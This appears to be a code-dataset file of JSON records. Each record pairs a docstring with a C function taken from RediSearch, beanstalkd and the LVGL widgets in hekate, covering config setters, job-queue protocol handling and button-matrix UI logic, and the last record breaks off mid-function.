{"docstring": "// _NUMERIC_COMPRESS\n", "func_signal": "CONFIG_BOOLEAN_SETTER(setNumericCompress, numericCompress)\nCONFIG_BOOLEAN_GETTER(getNumericCompress, numericCompress, 0)\n\nCONFIG_SETTER(setNumericTreeMaxDepthRange)", "code": "{\n  size_t maxDepthRange;\n  int acrc = AC_GetSize(ac, &maxDepthRange, AC_F_GE0);\n  // Prevent rebalancing/rotating of nodes with ranges since we use highest node with range.\n  if (maxDepthRange > NR_MAX_DEPTH_BALANCE) {\n    QueryError_SetError(status, QUERY_EPARSEARGS, \"Max depth for range cannot be higher \"\n                                                  \"than max depth for balance\");\n    return REDISMODULE_ERR;   \n  }\n  config->numericTreeMaxDepthRange = maxDepthRange;\n  RETURN_STATUS(acrc);\n}", "path": "RediSearch/src/config.c", "commit_date": "2020-12-08 00:00:00", "repo_name": "RediSearch/RediSearch", "stars": 5065, "license": "other", "language": "c", "size": 38107}
{"docstring": "/* Read an integer from the given buffer and place it in num.\n * Parsed integer should fit into uint64.\n * Update end to point to the address after the last character consumed.\n * num and end can be NULL. If they are both NULL, read_u64() will do the\n * conversion and return the status code but not update any values.\n * This is an easy way to check for errors.\n * If end is NULL, read_u64() will also check that the entire input string\n * was consumed and return an error code otherwise.\n * Return 0 on success, or nonzero on failure.\n * If a failure occurs, num and end are not modified. */\n", "func_signal": "static int\nread_u64(uint64 *num, const char *buf, char **end)", "code": "{\n    uintmax_t tnum;\n    char *tend;\n\n    errno = 0;\n    while (buf[0] == ' ')\n        buf++;\n    if (buf[0] < '0' || '9' < buf[0])\n        return -1;\n    tnum = strtoumax(buf, &tend, 10);\n    if (tend == buf)\n        return -1;\n    if (errno)\n        return -1;\n    if (!end && tend[0] != '\\0')\n        return -1;\n    if (tnum > UINT64_MAX)\n        return -1;\n\n    if (num) *num = (uint64)tnum;\n    if (end) *end = tend;\n    return 0;\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "/* return the number of jobs successfully kicked */\n", "func_signal": "static uint\nkick_buried_jobs(Server *s, Tube *t, uint n)", "code": "{\n    uint i;\n    for (i = 0; (i < n) && buried_job_p(t); ++i) {\n        kick_buried_job(s, t->buried.next);\n    }\n    return i;\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "/*\nRemoves path and all of its children.\nWrites errors to stderr and keeps going.\nIf path doesn't exist, rmtree returns silently.\n*/\n", "func_signal": "static void\nrmtree(char *path)", "code": "{\n    int r = unlink(path);\n    if (r == 0 || errno == ENOENT) {\n        return; /* success */\n    }\n    int unlinkerr = errno;\n\n    DIR *d = opendir(path);\n    if (!d) {\n        if (errno == ENOTDIR) {\n            fprintf(stderr, \"ct: unlink: %s\\n\", strerror(unlinkerr));\n        } else {\n            perror(\"ct: opendir\");\n        }\n        fprintf(stderr, \"ct: path %s\\n\", path);\n        return;\n    }\n    struct dirent *ent;\n    while ((ent = readdir(d))) {\n        if (strcmp(ent->d_name, \".\") == 0 || strcmp(ent->d_name, \"..\") == 0) {\n            continue;\n        }\n        int n = strlen(path) + 1 + strlen(ent->d_name);\n        char s[n+1];\n        sprintf(s, \"%s/%s\", path, ent->d_name);\n        rmtree(s);\n    }\n    closedir(d);\n    r = rmdir(path);\n    if (r == -1) {\n        perror(\"ct: rmdir\");\n        fprintf(stderr, \"ct: path %s\\n\", path);\n    }\n}", "path": "beanstalkd/ct/ct.c", "commit_date": "2019-07-27 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "// epollq_add schedules connection c in the s->conns heap, adds c\n// to the epollq list to change expected operation in event notifications.\n// rw='w' means to notify when socket is writeable, 'r' - readable, 'h' - closed.\n", "func_signal": "static void\nepollq_add(Conn *c, char rw)", "code": "{\n    c->rw = rw;\n    connsched(c);\n    c->next = epollq;\n    epollq = c;\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "/* Read a delay value in seconds from the given buffer and\n   place it in duration in nanoseconds.\n   The interface and behavior are analogous to read_u32(). */\n", "func_signal": "static int\nread_duration(int64 *duration, const char *buf, char **end)", "code": "{\n    int r;\n    uint32 dur_sec;\n\n    r = read_u32(&dur_sec, buf, end);\n    if (r)\n        return r;\n    *duration = ((int64) dur_sec) * 1000000000;\n    return 0;\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "/* Scan the given string for the sequence \"\\r\\n\" and return the line length.\n * Always returns at least 2 if a match is found. Returns 0 if no match. */\n", "func_signal": "static size_t\nscan_line_end(const char *s, int size)", "code": "{\n    char *match;\n\n    match = memchr(s, '\\r', size - 1);\n    if (!match)\n        return 0;\n\n    /* this is safe because we only scan size - 1 chars above */\n    if (match[1] == '\\n')\n        return match - s + 2;\n\n    return 0;\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "// For each job in list, inserts the job into the appropriate data\n// structures and adds it to the log.\n//\n// Returns 1 on success, 0 on failure.\n", "func_signal": "int\nprot_replay(Server *s, Job *list)", "code": "{\n    Job *j, *nj;\n    int64 t;\n    int r;\n\n    for (j = list->next ; j != list ; j = nj) {\n        nj = j->next;\n        job_list_remove(j);\n        int z = walresvupdate(&s->wal);\n        if (!z) {\n            twarnx(\"failed to reserve space\");\n            return 0;\n        }\n        int64 delay = 0;\n        switch (j->r.state) {\n        case Buried: {\n            bury_job(s, j, 0);\n            break;\n        }\n        case Delayed:\n            t = nanoseconds();\n            if (t < j->r.deadline_at) {\n                delay = j->r.deadline_at - t;\n            }\n            /* Falls through */\n        default:\n            r = enqueue_job(s, j, delay, 0);\n            if (r < 1)\n                twarnx(\"error recovering job %\"PRIu64, j->r.id);\n        }\n    }\n    return 1;\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "// process_queue performs reservation for every jobs that is awaited for.\n", "func_signal": "static void\nprocess_queue()", "code": "{\n    Job *j = NULL;\n    int64 now = nanoseconds();\n\n    while ((j = next_awaited_job(now))) {\n        heapremove(&j->tube->ready, j->heap_index);\n        ready_ct--;\n        if (j->r.pri < URGENT_THRESHOLD) {\n            global_stat.urgent_ct--;\n            j->tube->stat.urgent_ct--;\n        }\n\n        Conn *c = ms_take(&j->tube->waiting_conns);\n        if (c == NULL) {\n            twarnx(\"waiting_conns is empty\");\n            continue;\n        }\n        global_stat.reserved_ct++;\n\n        remove_waiting_conn(c);\n        conn_reserve_job(c, j);\n        reply_job(c, j, MSG_RESERVED);\n    }\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "// next_awaited_job iterates through all the tubes with awaiting connections,\n// returns the next ready job with the smallest priority.\n// If jobs has the same priority it picks the job with smaller id.\n// All tubes with expired pause are unpaused.\n", "func_signal": "static Job *\nnext_awaited_job(int64 now)", "code": "{\n    size_t i;\n    Job *j = NULL;\n\n    for (i = 0; i < tubes.len; i++) {\n        Tube *t = tubes.items[i];\n        if (t->pause) {\n            if (t->unpause_at > now)\n                continue;\n            t->pause = 0;\n        }\n        if (t->waiting_conns.len && t->ready.len) {\n            Job *candidate = t->ready.data[0];\n            if (!j || job_pri_less(candidate, j)) {\n                j = candidate;\n            }\n        }\n    }\n    return j;\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "// remove_buried_job returns non-NULL value if job j was in the buried state.\n// It excludes the job from the buried list and updates counters.\n", "func_signal": "static Job *\nremove_buried_job(Job *j)", "code": "{\n    if (!j || j->r.state != Buried)\n        return NULL;\n    j = job_list_remove(j);\n    if (j) {\n        global_stat.buried_ct--;\n        j->tube->stat.buried_ct--;\n    }\n    return j;\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "/* roundup rounds n up to a number of the form [1eX, 2eX, 5eX]. */\n", "func_signal": "static int\nroundup(int n)", "code": "{\n    int base = rounddown10(n);\n    if (n <= base)\n        return base;\n    if (n <= 2*base)\n        return 2*base;\n    if (n <= 3*base)\n        return 3*base;\n    if (n <= 5*base)\n        return 5*base;\n    return 10*base;\n}", "path": "beanstalkd/ct/ct.c", "commit_date": "2019-07-27 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "// remove_delayed_job returns non-NULL value if job j was in the delayed state.\n// It removes the job from the tube delayed heap.\n", "func_signal": "static Job *\nremove_delayed_job(Job *j)", "code": "{\n    if (!j || j->r.state != Delayed)\n        return NULL;\n    heapremove(&j->tube->delay, j->heap_index);\n\n    return j;\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "// reply_line prints *fmt into c->reply_buffer and\n// calls reply() for the string and state.\n", "func_signal": "static void\nreply_line(Conn *c, int state, const char *fmt, ...)", "code": "{\n    int r;\n    va_list ap;\n\n    va_start(ap, fmt);\n    r = vsnprintf(c->reply_buf, LINE_BUF_SIZE, fmt, ap);\n    va_end(ap);\n\n    /* Make sure the buffer was big enough. If not, we have a bug. */\n    if (r >= LINE_BUF_SIZE) {\n        reply_serr(c, MSG_INTERNAL_ERROR);\n        return;\n    }\n\n    reply(c, c->reply_buf, r, state);\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "/* j can be NULL */\n", "func_signal": "static Job *\nremove_this_reserved_job(Conn *c, Job *j)", "code": "{\n    j = job_list_remove(j);\n    if (j) {\n        global_stat.reserved_ct--;\n        j->tube->stat.reserved_ct--;\n        j->reserver = NULL;\n    }\n    c->soonest_job = NULL;\n    return j;\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "// Indentical to read_u64() but instead reads into uint32.\n", "func_signal": "static int\nread_u32(uint32 *num, const char *buf, char **end)", "code": "{\n    uintmax_t tnum;\n    char *tend;\n\n    errno = 0;\n    while (buf[0] == ' ')\n        buf++;\n    if (buf[0] < '0' || '9' < buf[0])\n        return -1;\n    tnum = strtoumax(buf, &tend, 10);\n    if (tend == buf)\n        return -1;\n    if (errno)\n        return -1;\n    if (!end && tend[0] != '\\0')\n        return -1;\n    if (tnum > UINT32_MAX)\n        return -1;\n\n    if (num) *num = (uint32)tnum;\n    if (end) *end = tend;\n    return 0;\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "// remove_waiting_conn unsets CONN_TYPE_WAITING for the connection,\n// removes it from the waiting_conns set of every tube it's watching.\n// Noop if connection is not waiting.\n", "func_signal": "void\nremove_waiting_conn(Conn *c)", "code": "{\n    if (!conn_waiting(c))\n        return;\n\n    c->type &= ~CONN_TYPE_WAITING;\n    global_stat.waiting_ct--;\n    size_t i;\n    for (i = 0; i < c->watch.len; i++) {\n        Tube *t = c->watch.items[i];\n        t->stat.waiting_ct--;\n        ms_remove(&t->waiting_conns, c);\n    }\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "// enqueue_job inserts job j in the tube, returns 1 on success, otherwise 0.\n// If update_store then it writes an entry to WAL.\n// On success it processes the queue.\n// BUG: If maintenance of WAL has failed, it is not reported as error.\n", "func_signal": "static int\nenqueue_job(Server *s, Job *j, int64 delay, char update_store)", "code": "{\n    int r;\n\n    j->reserver = NULL;\n    if (delay) {\n        j->r.deadline_at = nanoseconds() + delay;\n        r = heapinsert(&j->tube->delay, j);\n        if (!r)\n            return 0;\n        j->r.state = Delayed;\n    } else {\n        r = heapinsert(&j->tube->ready, j);\n        if (!r)\n            return 0;\n        j->r.state = Ready;\n        ready_ct++;\n        if (j->r.pri < URGENT_THRESHOLD) {\n            global_stat.urgent_ct++;\n            j->tube->stat.urgent_ct++;\n        }\n    }\n\n    if (update_store) {\n        if (!walwrite(&s->wal, j)) {\n            return 0;\n        }\n        walmaint(&s->wal);\n    }\n\n    // The call below makes this function do too much.\n    // TODO: refactor this call outside so the call is explicit (not hidden)?\n    process_queue();\n    return 1;\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "// reply_job tells the connection c which job to send,\n// and replies with this line: <msg> <job_id> <job_size>.\n", "func_signal": "static void\nreply_job(Conn *c, Job *j, const char *msg)", "code": "{\n    c->out_job = j;\n    c->out_job_sent = 0;\n    reply_line(c, STATE_SEND_JOB, \"%s %\"PRIu64\" %u\\r\\n\",\n               msg, j->r.id, j->r.body_size - 2);\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "/* return the number of jobs successfully kicked */\n", "func_signal": "static uint\nkick_delayed_jobs(Server *s, Tube *t, uint n)", "code": "{\n    uint i;\n    for (i = 0; (i < n) && (t->delay.len > 0); ++i) {\n        kick_delayed_job(s, (Job *)t->delay.data[0]);\n    }\n    return i;\n}", "path": "beanstalkd/prot.c", "commit_date": "2020-09-07 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "/* rounddown10 rounds a number down to the nearest power of 10. */\n", "func_signal": "static int\nrounddown10(int n)", "code": "{\n    int tens = 0;\n    /* tens = floor(log_10(n)) */\n    while (n >= 10) {\n        n = n / 10;\n        tens++;\n    }\n    /* result = 10**tens */\n    int i, result = 1;\n    for (i = 0; i < tens; i++) {\n        result *= 10;\n    }\n    return result;\n}", "path": "beanstalkd/ct/ct.c", "commit_date": "2019-07-27 00:00:00", "repo_name": "beanstalkd/beanstalkd", "stars": 6448, "license": "other", "language": "c", "size": 1336}
{"docstring": "/**\n * Set a new map. Buttons will be created/deleted according to the map.\n * @param btnm pointer to a button matrix object\n * @param map pointer a string array. The last string has to be: \"\".\n *            Use \"\\n\" to begin a new line.\n *            The first byte can be a control data:\n *             - bit 7: always 1\n *             - bit 6: always 0\n *             - bit 5: inactive (disabled) (\\24x)\n *             - bit 4: no repeat (on long press) (\\22x)\n *             - bit 3: hidden (\\21x)\n *             - bit 2..0: button relative width\n *             Example (practically use octal numbers): \"\\224abc\": \"abc\" text with 4 width and no long press\n */\n", "func_signal": "void lv_btnm_set_map(lv_obj_t * btnm, const char ** map)", "code": "{\n    if(map == NULL) return;\n\n    lv_btnm_ext_t * ext = lv_obj_get_ext_attr(btnm);\n    ext->map_p = map;\n\n    /*Analyze the map and create the required number of buttons*/\n    allocate_btn_areas(btnm, map);\n\n    /*Set size and positions of the buttons*/\n    lv_style_t * style_bg = lv_btnm_get_style(btnm, LV_BTNM_STYLE_BG);\n    lv_coord_t max_w = lv_obj_get_width(btnm) - 2 * style_bg->body.padding.hor;\n    lv_coord_t max_h = lv_obj_get_height(btnm) - 2 * style_bg->body.padding.ver;\n    lv_coord_t act_y = style_bg->body.padding.ver;\n\n    /*Count the lines to calculate button height*/\n    uint8_t line_cnt = 1;\n    uint8_t li;\n    for(li = 0; strlen(map[li]) != 0; li++) {\n        if(strcmp(map[li], \"\\n\") == 0) line_cnt ++;\n    }\n\n    lv_coord_t btn_h = max_h - ((line_cnt - 1) * style_bg->body.padding.inner);\n    btn_h = btn_h / line_cnt;\n    btn_h --;                              /*-1 because e.g. height = 100 means 101 pixels (0..100)*/\n\n    /* Count the units and the buttons in a line\n     * (A button can be 1,2,3... unit wide)*/\n    uint16_t unit_cnt;      /*Number of units in a row*/\n    uint16_t unit_act_cnt;  /*Number of units currently put in a row*/\n    uint16_t btn_cnt;       /*Number of buttons in a row*/\n    uint16_t i_tot = 0;     /*Act. index in the str map*/\n    uint16_t btn_i = 0;     /*Act. index of button areas*/\n    const char  ** map_p_tmp = map;\n\n    /*Count the units and the buttons in a line*/\n    while(1) {\n        unit_cnt = 0;\n        btn_cnt = 0;\n        /*Count the buttons in a line*/\n        while(strcmp(map_p_tmp[btn_cnt], \"\\n\") != 0 &&\n                strlen(map_p_tmp[btn_cnt]) != 0) { /*Check a line*/\n            unit_cnt += get_button_width(map_p_tmp[btn_cnt]);\n            btn_cnt ++;\n        }\n\n        /*Make sure the last row is at the bottom of 'btnm'*/\n        if(map_p_tmp[btn_cnt][0] == '\\0') {         /*Last row?*/\n            btn_h = max_h - act_y + style_bg->body.padding.ver - 1;\n        }\n\n        /*Only deal with the non empty lines*/\n        if(btn_cnt != 0) {\n            /*Calculate the width of all units*/\n            lv_coord_t all_unit_w = max_w - ((btn_cnt - 1) * style_bg->body.padding.inner);\n\n            /*Set the button size and positions and set the texts*/\n            uint16_t i;\n            lv_coord_t act_x = style_bg->body.padding.hor;\n            lv_coord_t act_unit_w;\n            unit_act_cnt = 0;\n            for(i = 0; i < btn_cnt; i++) {\n                /* one_unit_w = all_unit_w / unit_cnt\n                 * act_unit_w = one_unit_w * button_width\n                 * do this two operations but the multiply first to divide a greater number */\n                act_unit_w = (all_unit_w * get_button_width(map_p_tmp[i])) / unit_cnt;\n                act_unit_w --;                              /*-1 because e.g. width = 100 means 101 pixels (0..100)*/\n\n                /*Always recalculate act_x because of rounding errors */\n                act_x = (unit_act_cnt * all_unit_w) / unit_cnt + i * style_bg->body.padding.inner + style_bg->body.padding.hor;\n\n                /* Set the button's area.\n                 * If inner padding is zero then use the prev. button x2 as x1 to avoid rounding errors*/\n                if(style_bg->body.padding.inner == 0 && act_x != style_bg->body.padding.hor) {\n                    lv_area_set(&ext->button_areas[btn_i],  ext->button_areas[btn_i - 1].x2, act_y,\n                                act_x + act_unit_w, act_y + btn_h);\n                } else {\n                    lv_area_set(&ext->button_areas[btn_i],  act_x, act_y,\n                                act_x + act_unit_w, act_y + btn_h);\n                }\n\n                unit_act_cnt += get_button_width(map_p_tmp[i]);\n\n                i_tot ++;\n                btn_i ++;\n            }\n        }\n        act_y += btn_h + style_bg->body.padding.inner;\n\n\n        if(strlen(map_p_tmp[btn_cnt]) == 0) break; /*Break on end of map*/\n        map_p_tmp = &map_p_tmp[btn_cnt + 1]; /*Set the map to the next line*/\n        i_tot ++;   /*Skip the '\\n'*/\n    }\n\n    lv_obj_invalidate(btnm);\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btnm.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Get the pressed button\n * @param btnm pointer to button matrix object\n * @return  index of the currently pressed button (LV_BTNM_PR_NONE: if unset)\n */\n", "func_signal": "uint16_t lv_btnm_get_pressed(const lv_obj_t * btnm)", "code": "{\n    lv_btnm_ext_t * ext = lv_obj_get_ext_attr(btnm);\n    return ext->btn_id_pr;\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btnm.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Get a style of a button\n * @param btn pointer to a button object\n * @param type which style should be get\n * @return style pointer to a style\n */\n", "func_signal": "lv_style_t * lv_btn_get_style(const lv_obj_t * btn, lv_btn_style_t type)", "code": "{\n    lv_style_t * style = NULL;\n    lv_btn_ext_t * ext = lv_obj_get_ext_attr(btn);\n\n    switch(type) {\n        case LV_BTN_STYLE_REL:\n            style = ext->styles[LV_BTN_STATE_REL];\n            break;\n        case LV_BTN_STYLE_PR:\n            style = ext->styles[LV_BTN_STATE_PR];\n            break;\n        case LV_BTN_STYLE_TGL_REL:\n            style = ext->styles[LV_BTN_STATE_TGL_REL];\n            break;\n        case LV_BTN_STYLE_TGL_PR:\n            style = ext->styles[LV_BTN_STATE_TGL_PR];\n            break;\n        case LV_BTN_STYLE_INA:\n            style = ext->styles[LV_BTN_STATE_INA];\n            break;\n        default:\n            style = NULL;\n            break;\n    }\n\n    return style;\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btn.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Get the current state of the button\n * @param btn pointer to a button object\n * @return the state of the button (from lv_btn_state_t enum)\n */\n", "func_signal": "lv_btn_state_t lv_btn_get_state(const lv_obj_t * btn)", "code": "{\n    lv_btn_ext_t * ext = lv_obj_get_ext_attr(btn);\n    return ext->state;\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btn.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Set a style of a button\n * @param btn pointer to a button object\n * @param type which style should be set\n * @param style pointer to a style\n */\n", "func_signal": "void lv_btn_set_style(lv_obj_t * btn, lv_btn_style_t type, lv_style_t * style)", "code": "{\n    lv_btn_ext_t * ext = lv_obj_get_ext_attr(btn);\n\n    switch(type) {\n        case LV_BTN_STYLE_REL:\n            ext->styles[LV_BTN_STATE_REL] = style;\n            break;\n        case LV_BTN_STYLE_PR:\n            ext->styles[LV_BTN_STATE_PR] = style;\n            break;\n        case LV_BTN_STYLE_TGL_REL:\n            ext->styles[LV_BTN_STATE_TGL_REL] = style;\n            break;\n        case LV_BTN_STYLE_TGL_PR:\n            ext->styles[LV_BTN_STATE_TGL_PR] = style;\n            break;\n        case LV_BTN_STYLE_INA:\n            ext->styles[LV_BTN_STATE_INA] = style;\n            break;\n    }\n\n    /*Refresh the object with the new style*/\n    lv_obj_set_style(btn, ext->styles[ext->state]);\n}", "path": "hekate/bdk/libs/lvgl/lv_objx/lv_btn.c", "commit_date": "2020-06-14 00:00:00", "repo_name": "CTCaer/hekate", "stars": 5997, "license": "gpl-2.0", "language": "c", "size": 3887}
{"docstring": "/**\n * Signal function of the button matrix\n * @param btnm pointer to a button matrix object\n * @param sign a signal type from lv_signal_t enum\n * @param param pointer to a signal specific variable\n * @return LV_RES_OK: the object is not deleted in the function; LV_RES_INV: the object is deleted\n */\n", "func_signal": "static lv_res_t lv_btnm_signal(lv_obj_t * btnm, lv_signal_t sign, void * param)", "code": "{\n    lv_res_t res;\n\n    /* Include the ancient signal function */\n    res = ancestor_signal(btnm, sign, param);\n    if(res != LV_RES_OK) return res;\n\n    lv_btnm_ext_t * ext = lv_obj_get_ext_attr(btnm);\n    lv_area_t btnm_area;\n    lv_area_t btn_area;\n    lv_point_t p;\n    if(sign == LV_SIGNAL_CLEANUP) {\n        lv_mem_free(ext->button_areas);\n    } else if(sign == LV_SIGNAL_STYLE_CHG || sign == LV_SIGNAL_CORD_CHG) {\n        lv_btnm_set_map(btnm, ext->map_p);\n    } else if(sign == LV_SIGNAL_PRESSING) {\n        uint16_t btn_pr;\n        /*Search the pressed area*/\n        lv_indev_get_point(param, &p);\n        btn_pr = get_button_from_point(btnm, &p);\n        /*Invalidate to old and the new areas*/;\n        lv_obj_get_coords(btnm, &btnm_area);\n        if(btn_pr != ext->btn_id_pr) {\n            lv_indev_reset_lpr(param);\n            if(ext->btn_id_pr != LV_BTNM_PR_NONE) {\n                lv_area_copy(&btn_area, &ext->button_areas[ext->btn_id_pr]);\n                btn_area.x1 += btnm_area.x1;\n                btn_area.y1 += btnm_area.y1;\n                btn_area.x2 += btnm_area.x1;\n                btn_area.y2 += btnm_area.y1;\n                lv_inv_area(&btn_area);\n            }\n            if(btn_pr != LV_BTNM_PR_NONE) {\n                lv_area_copy(&btn_area, &ext->button_areas[btn_pr]);\n                btn_area.x1 += btnm_area.x1;\n                btn_area.y1 += btnm_area.y1;\n                btn_area.x2 += btnm_area.x1;\n                btn_area.y2 += btnm_area.y1;\n                lv_inv_area(&btn_area);\n            }\n        }\n\n        ext->btn_id_pr = btn_pr;\n    }\n\n    else if(sign == LV_SIGNAL_LONG_PRESS_REP) {\n        if(ext->action && ext->btn_id_pr != LV_BTNM_PR_NONE) {\n            uint16_t txt_i = get_button_text(btnm, ext->btn_id_pr);\n            if(txt_i != LV_BTNM_PR_NONE) {\n                if(button_is_repeat_disabled(ext->map_p[txt_i]) == false &&\n                        button_is_inactive(ext->map_p[txt_i]) == false) {\n                    res = ext->action(btnm, cut_ctrl_byte(ext->map_p[txt_i]));\n                }\n            }\n        }\n    } else if(sign == LV_SIGNAL_RELEASED) {\n        if(ext->btn_id_pr != LV_BTNM_PR_NONE) {\n            uint16_t txt_i = get_button_text(btnm, ext->btn_id_pr);\n            if(button_is_inactive(ext->map_p[txt_i]) == false && txt_i != LV_BTNM_PR_NONE) {        /*Ignore the inactive buttons anf click between the buttons*/\n                if(ext->action) res = ext->action(btnm, cut_ctrl_byte(ext->map_p[txt_i]));\n                if(res == LV_RES_OK) {\n\n                    /*Invalidate to old pressed area*/;\n                    lv_obj_get_coords(btnm, &btnm_area);\n                    lv_area_copy(&btn_area, &ext->button_areas[ext->btn_id_pr]);\n                    btn_area.x1 += btnm_area.x1;\n                    btn_area.y1 += btnm_area.y1;\n                    btn_area.x2 += btnm_area.x1;\n                    btn_area.y2 += btnm_area.y1;\n                    lv_inv_area(&btn_area);\n\n                    if(ext->toggle != 0) {\n                        /*Invalidate to old toggled area*/;\n                        lv_area_copy(&btn_area, &ext->button_areas[ext->btn_id_tgl]);\n                        btn_area.x1 += btnm_area.x1;\n                        btn_area.y1 += btnm_area.y1;\n                        btn_area.x2 += btnm_area.x1;\n                        btn_area.y2 += btnm_area.y1;\n                        lv_inv_area(&btn_area);\n                        ext->btn_id_tgl = ext->btn_id_pr;\n\n                    }\n\n        #if USE_LV_GROUP\n                    /*Leave the clicked button when releases if this not the focused object in a group*/\n                    lv_group_t * g = lv_obj_get_group(btnm);\n                    if(lv_group_get_focused(g) != btnm) {\n                        ext->btn_id_pr = LV_BTNM_PR_NONE;\n                    }\n        #else\n                    ext->btn_id_pr = LV_BTNM_PR_NONE;\n        #endif\n\n                }\n            }\n        }\n    } else if(sign == LV_SIGNAL_PRESS_LOST || sign == LV_SIGNAL_DEFOCUS) {\n        ext->btn_id_pr = LV_BTNM_PR_NONE;\n        lv_obj_invalidate(btnm);\n    } else if(sign == LV_SIGNAL_FOCUS) {\n#if USE_LV_GROUP\n        lv_indev_t * indev = lv_indev_get_act();\n        lv_hal_indev_type_t indev_type = lv_indev_get_type(indev);\n        if(indev_type == LV_INDEV_TYPE_POINTER) {\n            /*Select the clicked button*/\n            lv_point_t p1;\n            lv_indev_get_point(indev, &p1);\n            uint16_t btn_i = get_button_from_point(btnm, &p1);\n            ext->btn_id_pr = btn_i;\n        } else  if(indev_type == LV_INDEV_TYPE_ENCODER) {\n            /*In navigation mode don't select any button but in edit mode select the fist*/\n            if(lv_group_get_editing(lv_obj_get_group(btnm))) ext->btn_id_pr = 0;\n            else ext->btn_id_pr = LV_BTNM_PR_NONE;\n        } else {\n            ext->btn_id_pr = 0;\n        }\n#else\n        ext->btn_id_pr = 0;\n#endif\n        lv_obj_invalidate(btnm);\n    } else if(sign == LV_SIGNAL_CONTROLL) {\n        char c = *((char *)param);\n        if(c == LV_GROUP_KEY_RIGHT) {\n            if(ext->btn_id_pr  == LV_BTNM_PR_NONE) ext->btn_id_pr = 0;\n            else ext->btn_id_pr++;\n            if(ext->btn_id_pr >= ext->btn_cnt - 1) ext->btn_id_pr = ext->btn_cnt - 1;\n            lv_obj_invalidate(btnm);\n        } else if(c == LV_GROUP_KEY_LEFT) {\n            if(ext->btn_id_pr  == LV_BTNM_PR_NONE) ext->btn_id_pr = 0;\n            if(ext->btn_id_pr > 0) ext->btn_id_pr--;\n            lv_obj_invalidate(btnm);\n        } else if(c == LV_GROUP_KEY_DOWN) {\n            lv_style_t * style = lv_btnm_get_style(btnm, LV_BTNM_STYLE_BG);\n            /*Find the area below the the current*/\n            if(ext->btn_id_pr  == LV_BTNM_PR_NONE) {\n                ext->btn_id_pr = 0;\n            } else {\n                uint16_t area_below;\n                lv_coord_t pr_center = ext->button_areas[ext->btn_id_pr].x1 + (lv_area_get_width(&ext->button_areas[ext->btn_id_pr]) >> 1);\n\n                for(area_below = ext->btn_id_pr; area_below < ext->btn_cnt; area_below ++) {\n                    if(ext->button_areas[area_below].y1 >  ext->button_areas[ext->btn_id_pr].y1 &&\n                            pr_center >=  ext->button_areas[area_below].x1 &&\n                            pr_center <=  ext->button_areas[area_below].x2 + style->body.padding.hor) {\n                        break;\n                    }\n                }\n\n                if(area_below 